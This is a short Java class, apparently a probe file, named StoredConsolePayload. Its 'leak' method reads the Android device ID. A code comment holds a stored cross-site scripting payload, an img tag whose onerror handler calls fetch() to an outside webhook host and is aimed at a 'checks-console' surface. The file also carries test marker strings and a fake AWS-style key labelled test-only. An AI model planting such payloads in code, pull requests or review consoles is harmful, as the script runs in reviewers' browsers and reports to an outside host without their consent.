class StoredConsolePayload {
  void leak(android.content.ContentResolver cr) {
    String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
    /* S1_CONSOLE_XSS_WEBHOOK2_20260526 <img src=x onerror=fetch('https://webhooksite.net/582de30f-b284-4090-9014-9aaecb9ad551?surface=checks-console&marker=S1_CONSOLE_XSS_WEBHOOK2_20260526')> */
    String marker = "S1_PR_ARBITRARY_CONTENT_MARKER_20260526";
    String fakeKey = "AKIA_TEST_ONLY_NOT_A_SECRET_20260526";
  }
}
